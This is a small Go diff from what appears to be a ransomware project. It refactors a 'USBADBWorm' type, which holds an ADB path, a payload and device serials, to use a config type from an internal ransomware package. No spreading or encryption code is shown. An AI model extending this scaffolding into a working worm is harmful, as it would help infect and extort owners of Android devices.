@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"fmt"
 	"os"
@@ -11,13 +13,13 @@ import (
 )
 
 type USBADBWorm struct {
-	config     *RansomwareConfig
+	config     *rw.RansomwareConfig
 	adbPath    string
 	payload    []byte
 	deviceSerials []string
 }
 
-func NewUSBADBWorm(cfg *RansomwareConfig) *USBADBWorm {
+func NewUSBADBWorm(cfg *rw.RansomwareConfig) *USBADBWorm {
 	return &USBADBWorm{
 		config: cfg,
 	}
